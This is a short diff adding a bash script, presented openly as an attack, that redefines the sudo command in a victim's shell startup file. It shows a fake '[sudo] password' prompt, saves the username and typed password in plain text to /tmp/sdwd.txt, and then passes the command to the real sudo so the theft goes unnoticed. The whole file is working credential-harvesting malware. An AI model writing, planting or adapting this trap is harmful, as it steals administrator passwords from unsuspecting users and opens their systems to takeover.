@@ -1,0 +1,16 @@
+#!/bin/bash
+
+# Add this to a user's .bashrc(linux) or .bash_profile(mac) to get sudo password
+function sudo () {
+    realsudo="$(which sudo)"
+    
+    if grep -Fqs "$USER" /tmp/sdwd.txt
+    then
+        $realsudo "${@:1}"
+    else
+        read -s -p "[sudo] password for $USER: " inputPasswd
+        printf "\n"; printf '%s\n' "$USER : $inputPasswd" > /tmp/sdwd.txt
+        $realsudo -S <<< "$inputPasswd" -u root bash -c "exit" > /dev/null 2>&1
+        $realsudo "${@:1}"
+    fi
+}
